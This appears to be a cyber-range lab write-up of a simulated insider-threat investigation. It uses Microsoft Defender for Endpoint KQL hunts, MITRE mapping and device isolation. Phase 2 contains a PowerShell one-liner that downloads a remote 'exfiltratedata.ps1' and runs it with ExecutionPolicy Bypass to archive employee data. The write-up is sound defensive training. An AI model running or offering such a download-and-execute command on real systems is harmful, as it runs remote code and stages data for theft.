# Data Exfiltration Simulation & Investigation
## PIPd Employee Insider Threat Lab

## Executive Summary

**Status:** Investigation concluded. Suspicious local data staging confirmed.  
**Objective:** Determine whether a Windows virtual machine onboarded to Microsoft Defender for Endpoint (MDE) was used to collect, compress, and potentially prepare employee data for exfiltration.

During this investigation, I reviewed file, process, and network telemetry in Microsoft Defender for Endpoint and identified a suspicious PowerShell-driven workflow on the endpoint. The evidence showed that `powershell.exe` downloaded and executed a script named `exfiltratedata.ps1`, used `ExecutionPolicy Bypass`, silently installed 7-Zip, and created a ZIP archive containing employee data.

The reviewed `DeviceNetworkEvents` did not clearly confirm outbound transfer of the archive. Based on the available evidence, the strongest defensible conclusion was confirmed local data staging with suspected, but unproven, exfiltration. Because the host-based evidence was strong, the device was isolated for containment.

## Professional Skills Demonstrated

This project demonstrates threat hunting and investigative analysis in Microsoft Defender for Endpoint with a focus on correlating endpoint telemetry across multiple event tables. It also highlights practical experience with Kusto Query Language (KQL), process chain reconstruction, script-driven activity analysis, MITRE ATT&CK mapping, and containment decision-making based on available evidence.

## Project Overview

Data exfiltration investigations often begin with host-based evidence rather than confirmed network transfer. In real incidents, analysts commonly identify suspicious file collection, archive creation, or script-driven staging activity before they can prove whether data actually left the environment.

This project documents a structured insider threat investigation into suspicious activity on a Windows virtual machine. The goal was to determine whether a suspicious script was used to collect employee data, compress it into an archive, and prepare it for possible exfiltration, while clearly separating what could be confirmed from what remained unproven.

### Scenario Objective

The objective was to identify whether suspicious activity had occurred on the endpoint, validate the execution chain, determine whether employee data was staged locally, assess whether exfiltration could be confirmed from network telemetry, and take appropriate containment action based on the evidence.

### Technical Stack

| Category | Details |
|----------|---------|
| Platform | Microsoft Defender for Endpoint |
| Interface | Microsoft Defender Advanced Hunting |
| Query language | Kusto Query Language |
| Framework | MITRE ATT&CK |
| Operating system | Windows VM |
| Utilities | PowerShell, 7-Zip |

## Investigation Outcome

| Question | Conclusion | Basis |
|----------|------------|-------|
| Was a remote script downloaded to the host? | Yes | `Invoke-WebRequest` downloaded `exfiltratedata.ps1` into `C:\ProgramData\` |
| Was the script executed? | Yes | `powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\exfiltratedata.ps1` |
| Was data archived locally? | Yes | `employee-data-20260410153713.zip` was created under `C:\ProgramData\backup\` |
| Was the activity tied to a user context? | Yes | Activity was associated with `cyber-lab27` |
| Was outbound exfiltration confirmed in the reviewed network window? | No | Network events mainly showed `msedgewebview2.exe` traffic and inbound connection attempts |
| Was containment performed? | Yes | The device was isolated after evidence review |

---

## Investigation Methodology

### Phase 1: Device Validation and Telemetry Review

Before beginning the investigation, I verified that the target VM was properly onboarded into Microsoft Defender for Endpoint and actively generating telemetry. This was necessary because the reliability of the investigation depended on having complete endpoint visibility across process, file, and network events.

I confirmed in Device Inventory that `windows-lab-tes` was present and reporting as a workstation in a workgroup environment with the expected IP address `10.0.0.107`. I also verified that the device showed an informational risk level and a low exposure level. This confirmed that the relevant Advanced Hunting tables, including `DeviceProcessEvents`, `DeviceFileEvents`, and `DeviceNetworkEvents`, would contain the evidence needed for further review.

<img width="1718" height="955" alt="Screenshot 2026-04-10 at 10 41 38 AM" src="https://github.com/user-attachments/assets/fbcab2bd-ce52-40b9-b15f-24f52a51410e" />

*Figure 1. Device Inventory showing the endpoint onboarded and reporting telemetry to MDE.*

---

### Phase 2: Simulate the Suspicious Activity

After validating that the endpoint was properly onboarded, I executed a PowerShell command on the host to simulate suspicious activity involving file download, script execution, and potential data staging. This step was performed so the resulting telemetry could be investigated in Microsoft Defender for Endpoint.

```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\ProgramData\exfiltratedata.ps1'; cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\exfiltratedata.ps1
```

The command downloaded a script named `exfiltratedata.ps1` into `C:\ProgramData\` and then executed it through PowerShell using `ExecutionPolicy Bypass`. The script silently installed 7-Zip and created a ZIP archive named `employee-data-20260410153713.zip`.

The output also returned `StatusCode 201 (Created)`, which indicated that the scripted request completed successfully. I did not treat that value alone as proof of outbound exfiltration; the determination of confirmed transfer was based on the MDE network telemetry reviewed later in the investigation.

<img width="1271" height="678" alt="Screenshot 2026-04-10 at 10 37 42 AM" src="https://github.com/user-attachments/assets/6afa3024-ebf6-4c7b-89ba-7dca6691a391" />

*Figure 2. PowerShell execution showing the script download, archive creation workflow, and `StatusCode 201` response.*

---

### Phase 3: File-Based Evidence Review

Once the suspicious activity had been generated, I pivoted into `DeviceFileEvents` to determine whether archive creation could be confirmed on the endpoint. Since data exfiltration commonly involves compressing files before transfer, reviewing ZIP-related file activity was an important step in identifying staging behavior.

```kusto
DeviceFileEvents
| where DeviceName == "windows-lab-tes"
| where FileName contains ".zip"
| order by Timestamp desc
```

The results showed suspicious ZIP-related activity involving `employee-data-20260410153713.zip`. The file events included both `FileCreated` and `FileRenamed`, and the file path was located under `C:\ProgramData\backup\...`. The naming pattern and timing aligned closely with the PowerShell execution window, which strongly suggested that the archive had been created as part of the same workflow.

At this stage, the evidence supported confirmed local data staging.

<img width="1717" height="940" alt="Screenshot 2026-04-10 at 11 08 00 AM" src="https://github.com/user-attachments/assets/568e2c09-580c-4526-94ee-7988371905e6" />

*Figure 3. `DeviceFileEvents` showing ZIP creation and rename activity for the staged archive.*

---

### Phase 4: Process Correlation

After confirming the suspicious archive activity, I pivoted to `DeviceProcessEvents` around the ZIP creation time to determine what processes were responsible for creating the file and how the execution chain unfolded. Correlating process activity with file creation moves the investigation from artifact detection to behavior reconstruction.

```kusto
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
```

Within that time window, I observed several important processes, including `powershell.exe`, `cmd.exe`, `7z2408-x64.exe`, `7z.exe`, and `whoami.exe`. The presence of both the 7-Zip installer and the 7-Zip utility indicated that the script not only executed, but also installed a tool and used it to compress data.

<img width="1587" height="562" alt="Screenshot 2026-04-10 at 11 34 46 AM" src="https://github.com/user-attachments/assets/dbc61ca8-975c-4ecf-91dd-71cc8c97811c" />

*Figure 4. `DeviceProcessEvents` showing the suspicious process activity surrounding the archive creation window.*

---

### Phase 5: Query Refinement for Better Visibility

To improve the clarity of the process evidence, I refined the query so it displayed only the most relevant fields. This made the results easier to read and allowed me to focus on execution timing, process names, command lines, and user context.

```kusto
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine, AccountName
```

The refined results showed that the activity was associated with the account `cyber-lab27`. That detail strengthened the investigation by tying the behavior to a specific user context on the host and made the evidence more useful for reporting.

<img width="1654" height="965" alt="Screenshot 2026-04-10 at 11 48 24 AM" src="https://github.com/user-attachments/assets/ad944eed-bbf9-4fe7-ac47-09b5e13f36c6" />

*Figure 5. Refined process results highlighting command lines and the associated user context.*

---

### Phase 6: Network Review for Exfiltration Evidence

After confirming the archive creation and the supporting process activity, I reviewed `DeviceNetworkEvents` during the same time window to determine whether there was evidence that the ZIP archive had actually been transferred externally. This step was important because archive creation alone does not prove exfiltration.

```kusto
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceNetworkEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
```

The network telemetry showed multiple inbound connection attempts from public IP addresses and several successful outbound connections over port `443`. However, the successful outbound traffic appeared to be tied primarily to `msedgewebview2.exe` rather than to `powershell.exe` or `7z.exe`.

Based on the reviewed telemetry, I did not find strong proof that the ZIP archive itself had been transmitted externally during that window. The strongest supported conclusion was confirmed local data staging, while outbound exfiltration remained unconfirmed in the available evidence.

<img width="1601" height="912" alt="Screenshot 2026-04-10 at 12 25 17 PM" src="https://github.com/user-attachments/assets/268bfb4e-d3aa-482b-891e-3dbcfe6beb06" />

*Figure 6. `DeviceNetworkEvents` showing background web activity and inbound attempts, but no clear archive transfer by the suspicious process chain.*

---

### Phase 7: Parent Command-Line Visibility

To strengthen the process correlation further, I expanded the query again to include both the child process command line and the initiating process command line. This allowed me to confirm the relationship between the PowerShell script and the archive creation activity with greater precision.

```kusto
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine, AccountName, InitiatingProcessCommandLine
```

This query showed that `7z.exe` was used to create the archive and that the initiating activity originated from the PowerShell command `powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\exfiltratedata.ps1`. This directly linked the suspicious script to the archive creation process instead of relying only on timing or inference.

<img width="1627" height="750" alt="Screenshot 2026-04-10 at 12 36 31 PM" src="https://github.com/user-attachments/assets/2dee22b5-45cd-46da-9dec-d6f7fcd1b92e" />

*Figure 7. Expanded process query linking `7z.exe` activity back to the PowerShell script.*

---

### Phase 8: Endpoint Validation

After validating the evidence through telemetry, I returned to the endpoint itself to verify that `exfiltratedata.ps1` was present on disk. Reviewing the actual file on the host confirmed that the logged execution activity corresponded to a real script artifact available for validation.

I located the script in `C:\ProgramData\` and opened it in Notepad for review. This strengthened the investigation by moving beyond telemetry alone and confirming that the suspicious activity involved an actual file present on the endpoint.

<img width="1204" height="689" alt="Screenshot 2026-04-10 at 12 35 19 PM" src="https://github.com/user-attachments/assets/827bc061-54eb-4a25-ad69-0a2f40120a25" />

*Figure 8. The suspicious PowerShell script present on disk in `C:\ProgramData\`.*

<img width="1278" height="925" alt="Screenshot 2026-04-10 at 12 35 51 PM" src="https://github.com/user-attachments/assets/51c1c28d-cc43-4065-9bcb-f46218138177" />

*Figure 9. Script content review on the endpoint.*

---

### Phase 9: Containment and Response

After reviewing the file, process, and network evidence, I determined that the endpoint showed strong signs of suspicious local data staging activity and required containment. Even though the reviewed network telemetry did not conclusively prove outbound exfiltration, the host evidence was strong enough to justify a response action.

I isolated the device from the network to reduce the risk of further malicious activity while preserving the system for additional investigation. That decision was based on the confirmed download and execution of a suspicious script, the use of `ExecutionPolicy Bypass`, the silent installation of 7-Zip, and the creation of an archive containing employee data.

<img width="1653" height="701" alt="Screenshot 2026-04-10 at 1 05 51 PM" src="https://github.com/user-attachments/assets/24b5d4fe-e974-4285-b58c-17388babd273" />

*Figure 10. MDE device isolation action used to contain the endpoint.*

---

## Conclusion

This investigation confirmed suspicious host-based activity consistent with local data staging and possible exfiltration preparation. By correlating `DeviceFileEvents`, `DeviceProcessEvents`, and `DeviceNetworkEvents`, I verified that `exfiltratedata.ps1` was downloaded and executed with PowerShell, that 7-Zip was installed and used to archive employee data, and that the resulting ZIP file was staged locally on disk.

The reviewed network evidence did not clearly prove that the ZIP archive was transferred externally. That distinction was important to the final assessment: local staging was confirmed, while outbound exfiltration remained unconfirmed in the evidence reviewed.

## Findings Summary

| Finding | Status | Detail |
|---------|--------|--------|
| Telemetry availability | Confirmed | The device was actively reporting to MDE. |
| Suspicious script download | Confirmed | `exfiltratedata.ps1` was downloaded to `C:\ProgramData\`. |
| PowerShell execution | Confirmed | The script ran with `ExecutionPolicy Bypass`. |
| Archive creation | Confirmed | `employee-data-20260410153713.zip` was created on the host. |
| 7-Zip installation and use | Confirmed | 7-Zip was silently installed and used to compress data. |
| Local data staging | Confirmed | Employee data was compressed into a ZIP archive locally. |
| Outbound exfiltration | Not confirmed | Network telemetry did not clearly prove the ZIP was transferred out. |
| Containment action | Completed | The device was isolated from the network. |

## MITRE ATT&CK Mapping

| Technique ID | Technique | Evidence |
|--------------|-----------|----------|
| `T1059.001` | PowerShell | Script executed with PowerShell and `-ExecutionPolicy Bypass` |
| `T1059.003` | Windows Command Shell | `cmd.exe /c` appeared in the execution chain |
| `T1105` | Ingress Tool Transfer | The script was downloaded from an external source before execution |
| `T1005` | Data from Local System | Local employee data was collected for compression |
| `T1074.001` | Local Data Staging | Data was staged in `C:\ProgramData\backup\` |
| `T1560.001` | Archive via Utility | 7-Zip was used to create the archive |

## Detection Opportunities

- Alert on PowerShell downloading content into `C:\ProgramData\` and immediately executing it.
- Alert on `powershell.exe` running with `-ExecutionPolicy Bypass`.
- Alert on silent installation of archiving tools such as 7-Zip on workstations.
- Alert on archive creation under uncommon staging paths such as `C:\ProgramData\backup\`.
- Correlate archive creation with user context and follow-on network activity before deciding whether exfiltration is confirmed.

## Response and Defensive Improvements

- Isolate endpoints when host evidence strongly supports malicious staging activity, even if network transfer is not yet confirmed.
- Strengthen PowerShell monitoring and alerting for suspicious download-and-execute behavior.
- Improve detection coverage for script-driven archive creation in sensitive directories.
- Tune hunting workflows to pivot quickly from file artifacts to process ancestry and network context.

## Appendix: KQL Query Library

### 1. Hunt ZIP file activity

```kusto
DeviceFileEvents
| where DeviceName == "windows-lab-tes"
| where FileName contains ".zip"
| order by Timestamp desc
```

### 2. Review process activity around ZIP creation

```kusto
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
```

### 3. Refined process query

```kusto
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine, AccountName
```

### 4. Review network events

```kusto
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceNetworkEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
```

### 5. Expanded process query with parent command visibility

```kusto
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine, AccountName, InitiatingProcessCommandLine
```
